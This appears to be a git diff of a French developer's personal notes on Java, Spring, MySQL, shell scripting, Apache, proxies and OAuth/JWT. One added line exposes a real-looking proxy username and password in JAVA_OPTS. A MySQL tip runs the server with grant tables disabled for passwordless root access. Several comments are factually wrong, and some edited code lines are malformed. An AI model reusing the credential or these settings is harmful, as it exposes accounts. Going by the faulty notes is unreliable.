+                    // ci dessous: pour recuperer un bundle complettement ailleurs dans le meme karaf en java(l'autre façon c'est d'injecter dans blueprint)
+                  		BundleContext bundleContext = FrameworkUtil.getBundle(UnServiceDeCeBundleLa.class).getBundleContext();
+                  		@SuppressWarnings("rawtypes")
+                  		ServiceReference serviceReference = bundleContext.getServiceReference(une.classe.qui.est.un.service.dans.un.autre.bundle.AutreClasse.class.getCanonicalName());
+                  		return (String) serviceReference.getProperty("UNEPROPRIETTEESETTEE_DANS_LE_BLUEPRINT_DE_CET_AUTRE_BUNDLE");
+                  
+                } 
+                et la sous classe si c'est une interface mais bof autant faire une classe direct sans interface:
+                contient juste la methode                         
+                  public Collection getFeatures(@FormParam("SAMLResponse") String samlReponse) throws Exception {...} sans les annotations
+               Pour fair une servlet karaf LINKkarafservlet
+                   public class MetadataDisplayServlet extends HttpServlet
+                  { contient les methodes post et get habituelles
+   
 
 
 JAAS :
@@ -3294,6 +3476,9 @@ web.xml : webxml :
             session-config Definit un delai maximal d'inactivite pour les sessions.  
             		    sous <web-app>:<session-config>
                 	<session-timeout>15</session-timeout>
+                	   <cookie-config>
+                	       <secure>true</secure> // fait pareil que LINKlizifoizf  (a partir de servlet3.0)
+                	  <cookie-config>
                 </session-config>
             mime-mapping Definit une association entre les fichiers publics de l'application et des types MIME.  
             welcome-file-list Definit la ressource à retourner par defaut au client si aucune ressource n'est specifiee.  
@@ -3360,7 +3545,7 @@ web.xml : webxml :
                             </web-resource-collection>
                                 		
                                     <user-data-constraint>
-                                			<description>Protection should be CONFIDENTIAL</description>
+                                			<description>Protection should be CONFIDENTIAL</description> // pour que toute requete soit redirigée automatiquement de http vers https LINKjgjgjgjndndnd
                                 			<transport-guarantee>CONFIDENTIAL</transport-guarantee>
                                 		</user-data-constraint>
                                 		ou 
@@ -3452,16 +3637,7 @@ Pour convertir un input stream en output stream voir afficher
 	    }
 
 
-    PRG :
-          GET: ne modifie jamais l'état du systeme sauf des trucs comme le logs, ne fait que renvoyer data comme un select. always load pages using GET
-          PUT: ne fait que modifier update un data du système
-          POST: Fait tout ce que PUT ne fait pas: CREATION. never show pages in response to POST
-          DELETE: ne fait que supprimer un data du système. Peut etre async. voir LINKcodesHttp 20x 
-          Navigate from POST to GET using REDIRECT LINKredirwebservice998 //on peut faire comme ca dans un webservice qui a une methode post
-                        URI go = new URI("https://"+httpRequest.getServerName()+"/app/foryou/denied.html?samlDenied");
-                        javax.ws.rs.core.Response response = javax.ws.rs.core.Response.seeOther(go).build(); //LINKRedirectwebservice
-                        return response;
-
+    
 exemple de generation de graphique avec jcharts: c'est une jsp: 
                   <%@ page language="java" contentType="text/html; charset=ISO-8859-1" errorPage="/error_pages/redirect_error.jsp"%>
                   <%@ page import="es.renault.util.i18n.struts.services.I18NService, es.renault.util.i18n.I18NManager"%>
@@ -5469,19 +5645,6 @@ Spring : XML STYLE
                 <constructor-arg ref="openhr.session.configuration" /> // Attention ça c pas un argument de la classe HRSessionImpl mais c l'argument de la methode createSession du factory openhr.session.factory
                 </bean>
 
-          Cycle de vie du bean : 
-              – @RequestScoped (par defaut)
-              – @SessionScoped
-              – @ApplicationScoped // le bean est utilise pourl es proprietes generales de l'appli: ex: listes deroulantes qu'on voit tout le temps
-              – @ViewScoped
-              – @CustomScoped pour que les beans soient stockees dans le FacesContext (qui a une duree de vie plus courte que RequestScope donc FC est plus rapide, bouffe moins de memoire)
-              – @NoneScoped (si c un bean qui est reference par un autre bean qui lui est scoped)
-              >> attention un bean ne peut pas referencer un autre bean si son scope est plus petit que le sien (sauf les @NoneScoped que tous peuvent referencer)
-                  @PostConstruct-->Le bean est place dans son scope
-                  public void debut() { ... }
-                  @PreDestroy--->bean est retire du scope ou le scope est detruit.
-                  public void fin() { ... }
-          
       BOF.......Ca c pour JSF :
               FacesContext context = FacesContext.getCurrentInstance();
               Application application = context.getApplication();
@@ -5551,13 +5714,13 @@ Spring : XML STYLE
                             @Scope("request") (par exemp<le) ou @Scope(ConfigurableBeanFactory.SCOPE_SINGLETON)                             
                             public class MaClasseMonController // NE PAS l'appeler Controller tout court
                             {
-                                @ResponseBody // en tete de methode ou de classe pour qu'il soit cap de renvoyer que du json même si je retourne un objet java(webservice mais inutile si j'ai mis @RestController en tête de classe)
+                                @ResponseBody // en tete de methode ou de classe pour qu'il soit cap de renvoyer que du json même si je retourne un objet java(webservice mais inutile si j'ai mis @RestController en tête de classe) marche aussi avec les methodes get.
                                 @RequestMapping(value="/monpath.html" ou "/welcome",method=RequestMethod.POST ou .GET ou method={ RequestMethod.GET, RequestMethod.POST }) //est GET par defaut. ou ("/welcome") ou ("/welcome/{parametre1}/{parametre2}") // url: /welcome/toto/titi. consumes = "multipart/form-data" ou consumes={"toto","titi",MediaType.APPLICATION_JSON_VALUE})
                                 ou 
                                 @GetMapping("/mon/path/{param1}") // c'est comme @RequestMapping avec methode get. param1 se retrouve dans @PathVariable
-                                public ModelAndView helloworld(@ModelAttribute("student1") Student student1, BindingResult sierrorlorsdubiding //bind les parametres de mon formulaire id="student1" avec les champs ayant un name:"toto" avec mon objet Student qui a une methode getsetToto. @Valid//pourPrendreEnCompteLesAnnotAuDessusDesGettersEtSettersDeMesBeansPojo(voir @Size) ou @RequestBody Object[]  request ou ObjetJavaAvecAnnotations ou LinkedMultiValueMap<String, Object>//pour recuperer du JSON ou du XML. request ou @RequestPart Map request ou @PathVariable("parametre1") String monparam1, @PathVariable("parametre2") String monparam2, @PathVariable Map<String,String> rePathVar)// @PathVariable c pour l'URL ex:x/y/z. ou @RequestParam(value="parametre1",defaultValue="siParametre1EstNullVide", required=true) String monparam1, @RequestParam("parametre2") int monparam2) @RequestParam c pour la request ex:?filter=x: pour un post ca se met comme ca dans le body du post: paramname+"="+paramvalue; @RequestParam Map<String,String> reqPar) // du coup j'ai reqPar.get("monParametre1"); reqPar.get("monParametre1");)
-                                                                                                              Bind avec n'importe quel type de var: date, arraylist etc...Meme les objets sous-jacents
-                                                                                                              si je veux personaliser mon binding il faut utiliser une methode annotee avec @InitBinder (voir LINKInitBinder)
+                                public ModelAndView helloworld(@ModelAttribute("student1") Student student1, Error ou BindingResult sierrorlorsdubiding //bind les parametres de mon formulaire id="student1" avec les champs ayant un name:"toto" avec mon objet Student qui a une methode getsetToto. @Valid//pourPrendreEnCompteLesAnnotAuDessusDesGettersEtSettersDeMesBeansPojo(voir @Size) ou @RequestBody Object[]  request ou ObjetJavaAvecAnnotations ou LinkedMultiValueMap<String, Object>//pour recuperer du JSON ou du XML. request ou @RequestPart Map request ou @PathVariable("parametre1") String monparam1, @PathVariable("parametre2") String monparam2, @PathVariable Map<String,String> rePathVar)// @PathVariable c pour l'URL ex:x/y/z. ou @RequestParam(value="parametre1",defaultValue="siParametre1EstNullVide", required=true) String monparam1, @RequestParam("parametre2") int monparam2) @RequestParam c pour la request ex:?monparam2=x: pour un post ca se met comme ca dans le body du post: paramname+"="+paramvalue; @RequestParam Map<String,String> reqPar) // du coup j'ai reqPar.get("monParametre1"); reqPar.get("monParametre1");)
+                                                               ou                                               Bind avec n'importe quel type de var: date, arraylist etc...Meme les objets sous-jacents
+                                                               @Valid Student                                   si je veux personaliser mon binding il faut utiliser une methode annotee avec @InitBinder (voir LINKInitBinder)
                                 ou
                                 public String postCommentAgency(MultipartHttpServletRequest request, HttpServletResponse response){...
                                 {
@@ -5610,6 +5773,8 @@ Spring : XML STYLE
                                 @Size(min=2, max=30, message="titit{min} ljksdflo {max} sdlksd")
                                 @Size(min=2, max=30) // vient de la librairie de Hibernate. message d'erreur par defaut
                                 @Past // doit être une date dans le futur
+								@NotBlank // ne doit pas etre ni null ni ""
+								@NotNull // peut etre "" mais pas null
                                 monSetter(String toto) 
                                 
                               leNomDeMaJsp.jsp
@@ -5810,6 +5975,8 @@ Spring-batch :
                                     @SpringBootTest(webEnvironment=RANDOM_PORT//facultatif. Si c'est du springboot. Du coup c'est pour les tests d'integration. Pas pour les tests unitaires. On peut aussi forcer le port) si spring-boot: demarre carrement le serveur. // recherche la classe annotee @SpringBootApplication pour def ApplicationContext qui est partage entre toutes les methodes et classes de test sauf si on met @DirtiesContext
                                      ou
                                     @WebMvcTest(MaClasseControllerAvecAnnotationArobaseController_QueJeVeuxTester.class)// facultatif. que pour springboot. Si je ne met pas ca il wire tout. Là il wire Tout aussi mais que le @Controller spécifié. A l'inverse de @SpringBootTest ne demarre pas SpringBoot. Nous permet d'utiliser LINKmockmvc dans cette classe de test
+									ou
+									@WebAppConfiguration // dispo a partir de spring3.2:charge tous les urls des Controllers (pour spring mvc) doit être utilise avec @ContextConfiguration. Utilise pour indiquer que l'ApplicationContext doit être un WebApplicationContext. Il a besoin d'une librairie de serveur tel tomcat dans le pom en scope test
                                     puis
                                     @ContextHierarchy({ // facultatif. permet de definir une hierarchie de contexts: d'abord parent puis fils
                                     @ContextConfiguration(locations={"pathVersFichierXml/spring-dsTest-anot.xml","classpath:...","classpath:..."}) ou (classes={uneClasseAnnoteeConfigurationOuAutre.class}) Si on ne met rien il va chercher dans "classpath:/pathVersResources/NomClasseDeTest-context.xml// U que pour tests.// POUR CHARGER UNE CONF DANS LES TESTS. fonctionne de paire avec @TESTPROPERTYSOURCE. Apparemment inutile de mettre cette anotation si j'ai mis @WebMvcTest qui wire tout par défaut donc charge toutes les @Configuration
@@ -5818,7 +5985,6 @@ Spring-batch :
                                                           loader=AnnotationConfigContextLoader.class // Indispensable? si dans notre classe de test on a une classe statique de configuration à l'interieur.
                                                           initializers={ClasseInitializerFacultativeQuiSertAJeNeSaisPasQuoi.class}
                                ,@ContextConfiguration("fils.xml")}) // fin contextHierarchy . SI a l'initialisation spring des tests il ne trouve pas mon fichier xml: c parce qu'il est pas compile dans le classpath test-classpath: voir proprietes projet>java buildpath > s'assurer que les resources des tests sont compilees en sortie dans le path test-classes                         
-                                    @WebAppConfiguration // dispo a partir de spring3.2:charge tous les urls des Controllers doit être utilise avec @ContextConfiguration. Utilise pour indiquer que l'ApplicationContext doit être un WebApplicationContext. Il a besoin d'une librairie de serveur tel tomcat dans le pom en scope test
                                       public class MaClassDeTest {
                                           @Configuration
                                           static class MaConfig{  
@@ -5858,7 +6024,7 @@ Spring-batch :
                                       @Autowired ou @Inject
                                       IPermissionDao permissiondao;
                                       
-                                      @Autowired
+                                      @Autowired // inutile si MockMvcBuilder ci-dessous
 >>>                                   private MockMvc mockMvc; //LINKmockmvc
                                       @MockBean
 	                                  private MongoDBRepository mongodbRepo; ou une ClasseService maclasseService; LINKavecMockito
@@ -5916,14 +6082,14 @@ Spring-batch :
                                                                                                .param("jsonobj","{\"destination\":\"yaounde\",\"departure\":\"douala\",\"timedeparture\":\"3\",\"daydeparture\":\"01/01/2016\"}")
                                                                                                .content(request)) // requete envoyee si c'est du POST(je crois) ne s'applique pas pour du GET
                                                                                              )***    
-                                  			  .andExpect(status().isOk()) // necessite import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
+                                  			  ).andExpect(status().isOk()) // necessite import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
                                   			  .andExpect(content().contentType("application/json" ou "application/json;charset=UTF-8"))
                                   			  .andExpect(jsonPath("$.name").value("Lee"));
                                               .andExpect(jsonPath("nom").value("toto")); // pour verifier que le contenu renvoyé contient ce json. De org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath
                                               ou
                                               .andExpect(status().isForbidden());                
                                               .andDo(print())
-                                              .andReturn();  
+                                              .andReturn());  
                                                 String content = result.getResponse() //ou getRequest() ou getModelAndView()
                                                     .getContentAsString();
                                                 org.junit.Assert.assertNotNull(content);
@@ -7472,6 +7638,11 @@ this will show you all of the tables:
                                                                                          
 MYSQL :
    apres installation: 
+          cd C:\Program Files\MySQL\MySQL Server 5.6\bin\
+          mysqld.exe --initialize ou mysqld.exe --initialize --user=mysql si besoin pour la première fois apres installation. cree  le repertoire data.
+           puis
+          C:\Program Files\MySQL\MySQL Server 5.6\bin\mysqld --console --skip-grant-table(pour que je puisse me connecter en root sans mot de passe) (demarre le serveur mysql)
+                apres je pourrais refaire sans le --skip-grant-table quand j'aurais defini un mot de passe a mon user(ci dessous)
         demarrer le serveur mysql:
           pour arreter redemarrer mysql voir LINKmysql9938 
           cd C:\Program Files\MySQL\MySQL Server 5.6\bin\
@@ -7503,13 +7674,7 @@ MYSQL :
                    key c'est les index
                    auto_increment equivalent de la sequence sur oracle. Commence à compter à partir de.
          
-surwindows:
-          cd C:\Program Files\MySQL\MySQL Server 5.6\bin\
-          mysqld.exe --initialize si besoin pour la première fois apres installation. cree  le repertoire data.
-          ou mysqld.exe --initialize --user=mysql puis
-          C:\Program Files\MySQL\MySQL Server 5.6\bin\mysqld --console --skip-grant-table(pour que je puisse me connecter en root sans mot de passe) (demarre le serveur mysql)
-                apres je pourrais refaire sans le --skip-grant-table quand j'aurais defini un mot de passe a mon user(ci dessous)
-        se connecter :
+        se connecter:
             C:\Program Files\MySQL\MySQL Server 5.6\bin\mysql -uroot -p
             use mysql // change de base de database; UPDATE user SET Password=PASSWORD('my_password') where USER='root'; (deprecie depuis v5.7.6)
                                           ou 
@@ -7550,6 +7715,20 @@ se connecter :
       USE `ple_db_01`;
 afficher la liste des bases : 
   show databases;
+si j'ai erreur 
+	Caused by: java.sql.SQLException: The server time zone value 'Paris, Madrid (heure d??t?)' is unrecognized or represents more than one time zone.
+		j'ai eu beau avoir fait ça ca n'a pas marché: 
+					SET time_zone = '+00:00';
+					SET @@global.time_zone = '+00:00';
+					SET @@global.time_zone = 'Europe/Helsinki';
+					SELECT @@global.time_zone;
+					SELECT @@session.time_zone LIMIT 0, 1000
+				j'ai du faire 
+				jdbc.url=jdbc:mysql://localhost:3306/mycampus?useUnicode=true&useJDBCCompliantTimezoneShift=true&useLegacyDatetimeCode=false&serverTimezone=UTC\
+				au lieu de 
+				jdbc.url=jdbc:mysql://localhost:3306/mycampus
+				et ca a marché
+
 si il fait une erreur de group by a cause du sql_mode mal defini : 
     SELECT @@sql_mode 
         il affiche 'ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'
@@ -7562,7 +7741,7 @@ pour exporter la base de donnee via la console:
 Si un programme java n'arrive pas à se connecter à mysql 
       peut etre que le parametre d'encodage envoye à javarun n'est pas bon
 les donnees sont dans var/lib/mysql on peut le voir aussi en faisant select @@datadir;
-la conf de mysql est sur /etc/mysql/mysql.cnf ou /etc/mysql/mysql.conf.d/mysqld.cnf // dedans il defini dans quelle repertoire est la base de donnee 
+la configuration de mysql est sur /etc/mysql/mysql.cnf ou /etc/mysql/mysql.conf.d/mysqld.cnf // dedans il defini dans quelle repertoire est la base de donnee 
 pour voir les users et leur droits :
       SHOW GRANTS
 pour creer un user qui puisse se connecter à distance : (si j'ai l'erreur 1130) 
@@ -10559,9 +10738,6 @@ scripts bat :
           And here comes the catch: When you use parenthesis in your code then everything within the parenthesis counts as one single line 
 exemple de script .bat LINKDevopslksjqgfvmlka
 @echo off
-@echo off
-Set M3="C:\Program Files\JetBrains\IntelliJ IDEA Community Edition 2018.2.3\plugins\maven\lib\maven3\bin"
-Set "JAVA_HOME=C:\Program Files\Java\jdk1.8.0_181\jre"
   set /P version=Version ?
   echo %version%
 rem ljsdflsdkjf// commentaire
@@ -13014,7 +13190,7 @@ mobaxterm : (si j'arrive pas a faire du sftp parce que la connexion se coupe, ca
   pour enregistrer des macros: 
     repetitifs repertitive automatiser les saisies: menu macros> record new macro
   on peut ouvrir en multi fenetre (menu view)
-  installer des packages: cliquer sur icone packages dans le menu. (il va peut etre demander d'abord de setter des variables home et root). J'ai installé mksh    
+  installer des plugin extensions pluggins packages: cliquer sur icone packages dans le menu. (il va peut etre demander d'abord de setter des variables home et root). J'ai installé mksh    
 
 putty : (mobaxterm mieux que putty)
 pour rapidement se connecter avec un racourci: 
@@ -15065,6 +15241,7 @@ hacking : haking : hack :
               la parrade est: 
                       - Utiliser des jetons de validité dans les formulaires: faire en sorte qu'un formulaire posté ne soit accepté que s'il a été produit quelques minutes auparavant: le jeton de validité en sera la preuve. Le jeton de validité doit être transmis en paramètre et vérifié côté serveur.
                       - Effectuer une vérification du référent dans les pages sensibles: connaître la provenance du client permet de sécuriser ce genre d'attaques. Ceci consiste à bloquer la requête du client si la valeur de son référent est différente de la page d'où il doit théoriquement provenir.
+        Session hijacking: si pas en https: hacker peut sniffer sur le reseau mon jsessionid ou autre. Pour eviter faire LINKlizifoizf                      
     metasploitable:
         /usr/share/metasploit-framework
         chemin prog pour pirater:     /modules/exploits/...
@@ -15085,14 +15262,14 @@ cookies :
     
     dans le serveur setter le httponly: LINKcooklskjhh
                         NewCookie hraCookie= new NewCookie(UserManagementConstants.CONNECTION_ID, getDatasourceSessionIdFromContext(), "/", getCookieDomain(), null, -1, httpRequest.isSecure());
-                        return javax.ws.rs.core.Response.seeOther(go).header("Set-Cookie",hraCookie.toString()+"; Secure; HttpOnly").build();
+                        return javax.ws.rs.core.Response.seeOther(go).header("Set-Cookie",hraCookie.toString()+"; Secure; HttpOnly").build();                                              |_revoit true si on est en https
                           ou
                                         	final String cookiePath = "/";
                                       		final String cookieDomain = getCookieDomain();
-                                      		Cookie cookie = new Cookie(name, value);
+                                      		Cookie cookie = new Cookie(name, value); //exemple: ("bla,"bli");
                                       		cookie.setPath(cookiePath);
-                                      		//cookie.setSecure(httpRequest.isSecure());
-                                      		cookie.setSecure(true);
+                                      		//cookie.setSecure(httpRequest.isSecure()); //.isSecure() renvoit true si on est en https 
+                                      		cookie.setSecure(true); //setSecure: le cookie n'est transmis sur le reseau que si on est en https LINKlizifoizf
                                       		cookie.setHttpOnly(httpOnly);
 letsencrypt :
       les logs sont sous /var/log/letsencrypt/letsencrypt.log
@@ -15982,8 +16159,8 @@ JMockit :(le top car permet de tester l'intestable)>Mockito>EasyMock>Jmock AFAIR
     FilterConfig filterConfig = mock(FilterConfig.class);
     ServletContext context = mock(ServletContext.class);
     when(filterConfig.getServletContext(
-                                        anyString()//tout string
-                                        , eq(Http.GET)// si je peux pas faire "any" je fais ça
+    ou                                   anyString()//tout string
+    given                                  , eq(Http.GET)// si je peux pas faire "any" je fais ça
                                         ,anyObject(UneClasse.class)
                                         ).thenReturn(context);
     ResultDao rd =mock(ResultDao.class);
@@ -23091,7 +23268,12 @@ pour merger des cellules avec xspreadsheet: (f1j11swing.jar)
 					book.setSelection(1, 3, 2, 4);
 					book.setCellFormat(cf);
 					// Merges range D2:E3 (horizontal & vertical)
-pour lire un fichier csv utiliser la librairie opncsv-1.8.jar avec la class CSVReader qui possede une methode "readNext"
+pour lire un fichier csv utiliser la librairie opncsv-4.6.jar avec la class CSVReader qui possede une methode "readNext" lire doc:http://opencsv.sourceforge.net/#core_concepts
+                                                  <dependency>
+                                                    <groupId>com.opencsv</groupId>
+                                                    <artifactId>opencsv</artifactId>
+                                                    <version>4.6</version>
+                                                  </dependency>
 			private CSVReader csvReadingFile(FileInputStream fileInputStream) {
 			CSVReader csvReader = null;
 			NON!!! il faut utiliser les BufferedInputStream et output stream parce que buffered reader encode!
@@ -24451,6 +24633,12 @@ Remplacement de chaine1 (toutes les occurrences de chaine1) ,par chaine2 depuis 
 pour transformer la case: MAJ -> MIN ou l'inverse: altGR + ~
 
 bash :KSH :
+		pour faire une boucle loop
+			for projet in blabla blibli bloblo
+					do
+					  echo "mirror $projet "
+					done
+
       pour faire une pause dans un script ksh:
             read -p "Press [Enter] key to start backup..."
       pour faire un prompt dans un script ksh:
@@ -24477,7 +24665,9 @@ bash :KSH :
       pour faire un include importer d'un autre ksh dans un ksh
           . $path_vers_mon_autre_ksh/DDD_ExportPHX_environnement.ksh
       pour faire un substring: 
-          NOM_FICH_PAYS=$DATE_ENTREE`echo $ligneLu | cut -d":" -f 2`
+				echo ${stringvariable:2:4} // sauter 2 chars et prendre les 4 suivants
+				ou bien:
+				NOM_FICH_PAYS=$DATE_ENTREE`echo $ligneLu | cut -d":" -f 2`
           qui signifie:
           ma_variable =$uneautrevariableConcateneeAvec`echo $uneVariableQuiVaEtreSubstringuee | cut -d"monDelimiteur" -f NombreDeCharApresDelimiteur`
 bon exemplde ksh de lancement de batch: 
@@ -24588,7 +24778,10 @@ bon exemplde ksh de lancement de batch:
                                   if [ ${RET} -eq 0 ]
                                   then
 
-                      Script KSH pour remplacer tous les codeCIble"" par codeCible"0"
+                      Script KSH pour remplacer replace
+							repertoire=${project/".git"/"")} // remplace dans projet ".git" par rien du tout et met le resultat dans la variable repertoire.
+					  remplacer tous les codeCIble"" par codeCible"0"
+					  
                                 fusage()
                                 {
                                     echo " Parametre manquant: Ex: mpf_Renvoi.ksh Operation_Renvoi.xml"
@@ -24607,7 +24800,7 @@ bon exemplde ksh de lancement de batch:
                                   sed -e "s/codeCible=\"\"/codeCible=\"0\"/g" $1 > $HOME/tfi/$1.tmp // pour le faire le remplacement directement sur le même fichier sed -i.bak -e "s/remplacemoi(/parca(/g" nomdemonfichier // ça cree par ailleurs un fichier .bak qu'il faudra supprimer apres
                                           ^               ^               ^
                                     // "/s"=remplacer. remplace ce qui ya après s/ (codeCible="") par (/) codeCible="0" /g: cad partout. $1= parametre: on ecrit le resultat dans $HOME/tfi/$1.tmp
-                                    // du coup pour trouver certains fichiers et remplacer dans ceux trouver une chaine par une autre faire: 
+                                    // du coup pour trouver certains fichiers et remplacer dans ceux trouvés une chaine par une autre faire: 
                                             find . -type f -not -name '*.mp3' -not -name '*.bak'(important!) | xargs sed -i.bak -e "s/remplacemoi(/parca(/g"
                                 ret=$?  // on defini ret etant le retour du sed ci dessus: peut etre =1 ou 0
                                 if [ $ret -ne 0 ] // si ca ne renvoie pas 0 (0=erreur 1=OK)
@@ -25233,6 +25426,8 @@ si php n'est plus interpreté:
 redirection: expression regulières 
       RedirectMatch ^/shop(.*)$ https://www.wenhuaduverge.com$1 redirige tout ce qui se termine par /shopquelquechose vers wenhuaduverge.comquelquechose
 rediriger tout http vers https (j'ai essaye avec .htaccess mais n'a pas marche)
+      meth0: web.xml
+          voir LINKjgjgjgjndndnd
       meth1: 
         <VirtualHost...>
             RewriteEngine on
@@ -25348,7 +25543,7 @@ Pour rediriger les requetes du port 8080 de apache vers jetty:
                   RewriteCond "%{REMOTE_HOST}"  "^host1"  [OR] //si l'URL = ???ACOMPRENDRE expressionRegulière ou
                   RewriteCond %{HTTP_HOST} production-sodec.fr.auchan.com [OR] //si l'URL = ???ACOMPRENDRE expressionRegulière ou
                   RewriteCond "%{REMOTE_HOST}"  "^host3"       //si l'URL = ???ACOMPRENDRE expressionRegulière alors
-                  RewriteRule ^/hra-space$ hra-space/cas [R] //rediriger expresssionReguliere vers destination
+                  RewriteRule ^/hra-space$ hra-space/cas [R] //rediriger expressionReguliere vers destination
         DocumentRoot /var/www/www.wenhuaduverge.com/
       <Directory "/var/www/www.wenhuaduverge.com/shop">
         Options -Indexes FollowSymLinks
@@ -25489,41 +25684,22 @@ proxy :et reverse proxy :
                                         -------->etcetc... 
        une machine peut avoir plusieurs adresses ip et hostname: une par interface reseau.
       UnknownHostException
-          peut etre qu'il faut rajouter les parametres pour qu'il attaque le proxy (sur tomcat à mettre dans setup.sh) 
-            # Specifique AUCHAN pour SSO CAS (mettre les -D avant le -jar si j'execute un programme. Sur tomcat ceci se met dans setenv.sh)
+          
+            # Specifique AUCHAN pour SSO CAS (mettre les -D avant le -jar si j'execute un programme.)peut etre qu'il faut rajouter les parametres pour qu'il attaque le proxy (sur tomcat à mettre dans setup.sh ou plutot dans bin/setenv.bat  setenv.sh) 
+			sur unix:
               JAVA_OPTS="$JAVA_OPTS"" -Dhttps.proxyHost=FRSOPSLINFV01"
               JAVA_OPTS="$JAVA_OPTS"" -Dhttps.proxyPort=8080"
               JAVA_OPTS="$JAVA_OPTS"" -Dhttps.nonProxy(ou un truc comme ça)=url1|url2.... quand j'appelle ces URL alors je ne passe pas par le proxy.
+			  JAVA_OPTS="$JAVA_OPTS"" -Dhttp.proxyUser=username" 
+			  JAVA_OPTS="$JAVA_OPTS"" -Dhttp.proxyPassword=password"
+			  surwindows:
+				set "JAVA_OPTS=%JAVA_OPTS% -Dhttps.proxyHost=proxy.par.emea.cib"
+				set "JAVA_OPTS=%JAVA_OPTS% -Dhttps.proxyPort=8080"
+				set "JAVA_OPTS=%JAVA_OPTS% -Dhttp.proxyUser=ut2sn0"
+				set "JAVA_OPTS=%JAVA_OPTS% -Dhttp.proxyPassword=Federas123Federas"
+				set "JAVA_OPTS=%JAVA_OPTS% -Dhttps.nonProxy=localhost"
+
   
-                       
-
-
-
-ejb :
-exemple de code general qui utilise les bean, les home et remote interface:
-CustomerHome home = 
-// Get a reference to the 
-//CustomerHome object 
-
-Customer customer = 
-  home.create(new Integer(33));
-
-Name name = new Name("Richard", 
-       "Wayne", "Monson-Haefel");
-customer.setName(name);
-
-Enumeration enumOfCustomers = 
-          home.findByZip(55410);
-
-Customer customer2 = 
-     home.findByPrimaryKey(
-               new Integer(33));
-
-Name name2 = customer2.getName();
-
-// output is "Richard Wayne 
-//Monson-Haefel"
-System.out.println(name);
 
 cft :
     MonScriptShell.csh = 
@@ -26045,8 +26221,14 @@ yahoo.js :pour faire un drag and drop
         		new $wnd.YAHOO.util.DDTarget(e.id, affordance);
         	}-*/;
         // l'objet e peut maintenant etre la cible d'un autre objet drague
-
-ajax : // xmlhttprequest est remplacé maintenant par fetch (voir fetch.)
+fetch : LINKsljqffetch
+                        async mamethode() { 
+                              const response = await fetch("/hello");
+                              const { greeting } = await response.json();
+                              this.innerHTML = `
+                                  <h2>${greeting}</h2>
+                              `;
+ajax : // xmlhttprequest est remplacé maintenant par fetch (voir LINKsljqffetch)
                         ans = canvas.toDataURL("image/png");  //Pour sauver un canvas sur le serveur en image png ou jpg il faut obligatoirement envoyer les donnees en POST sinon le fichier genere est pourri:
             	    		var formData = new FormData(); ou new FormData(document.getElementById("forText")); // forText est juste un formulaire html recuperable avec document.getElement...ATTENTION les champs de mon formulaire doivent avoir un name sinon ils ne sont pas ajoute dans les formdata 
                             formData.append('ans', ans); // Append extra data before send.
@@ -30427,7 +30609,7 @@ JWT :
     stateless: pas besoin de session ni de base de donnée avec l'utilisateur dedans. Le token suffit a valider que je suis Laurent !=cookie de session ou le serveur conserve une table des sessions.
     bonne pratique: ajouter dans le payload sub:9830984,exp:0938098Z: subscribe et expire date shortlife: duree de vie courte.: du coup necesite background authentication a chaque requette: pour ça utiliser librairies.
                         toujour mettre aud: = audience = pour quel service/serveur uniquement sert ce token?
-                        toujours utiliser secret!= ou cle publique != par service/serveur
+                        toujours utiliser secret!= ou cle publique!= par service/serveur
                         toujours refuser les token avec algo:null. il faut qu'il y ait un algo. UN ALGO ET UN SEUL
      archi: [1Client(Mon Browser)]<----1-------->[1Authentificationservice pour tous: il a 1 clé privée differente pour chaque RessourceService a qui il donne la cle publique correspondante.]
                                    \___2_______>[xRessourcesServices: chacune a une clé publique.] 
@@ -30448,8 +30630,10 @@ est fait pour gerer que authorization à la base. Pas pour Authentification: On 
     EDSN transmet à FID: -scope // droits necessaires
     autres modes :
         ImplicitMode: ne passe que par le frontchanell: on bypasse la partie "ask code"-"recieve code": on obtien direct l'accessToken (pour les apps qui sont pure javascript)
-        Resource Owner password[crediential] flow : ne passe que par back (pour la compat des vieilles applis   |_client demande à l'authorizationServer un accessToken direct
-        Client credientials flow : ne passe que par back(pour les échanges entre machines uniquement)           |
+        Resource Owner password[crediential] flow : ne passe que par back (pour la compat des vieilles applis et de confiance   |
+                                              homme envoit user/password au client EDSN(prd la place du client_secret je crois) |_client demande à l'authorizationServer un accessToken direct
+        Client credientials flow : ne passe que par back(pour les échanges entre machines uniquement)                           |
+                                                   
     Run:
       USER va sur EDSN(Client)
       (facultatif)EDSN presente un bouton pour rediriger vers FID(AuthenticationServer). Si clique 
@@ -30467,7 +30651,7 @@ est fait pour gerer que authorization à la base. Pas pour Authentification: On 
                 return new ModelAndView(new RedirectView(request.getLocationUri()));
                                 -------------------------------------frontchannel---------------------->>>>>>>FID(AuthenticationServer) présente le prompt d'authentification. USER s'authentifie
                                                                                                               FID présente le consent Screen/scope. USER approuve. SI User n'approuve pas FID retournera ?error=x&error_description=y
-                                <<<<<<<<<<<<<<<<<<<<<<---------------frontchannel-----------------------------FID retourne AuthorizationCode=code=AuthorizationGrant(Dans les en-tête http.)+Token_ID si ImpriciteMode + renvoit le meme state qu'il a reçu ("tatatoto")                
+                                <<<<<<<<<<<<<<<<<<<<<<---------------frontchannel-----------------------------FID retourne AuthorizationCode=code=AuthorizationGrant(Dans les en-tête http.)+Token_ID si ImpliciteMode + renvoit le meme state qu'il a reçu ("tatatoto")                
                                                                     url = redirectURI = callback                        
     
     EDSN renvoit l’AuthorisationCode + idApplicatif + client_secret à FID--------backchannel------------>>>>>
@@ -30482,21 +30666,31 @@ est fait pour gerer que authorization à la base. Pas pour Authentification: On 
     EDSN envoit ResponseType=Token ou =Token_ID ---------------------------------frontchannel------------>>>>>
     =1ere étape si ImplicitMode                                                                                             
                                                                                                               FID vérifie que code n'est pas l'AuthorisationCode n'a pas été hacké grâce à client_secret
-                                              <<<<<<<<<<<<<<<<<<-----backchannel/frontSiImplicitMode--------- FID renvoit l’AccessToken(scopé&expirable)   +           Token_ID si OpenID =JWTSigné=JWS (AuthenticationServer doit supporter)
-                                                                                                                          expiration=xms     +TokenType=bearer                                 Signature avec SecretKey 
-    EDSN peut utiliser Token_ID:utilisateur est authentifié.                                                                                                                                   ou
-    EDSN demande une authorisation                                                                                                                                                             Signature avec paire de clé assymetriquesj,n (donc clé privée)
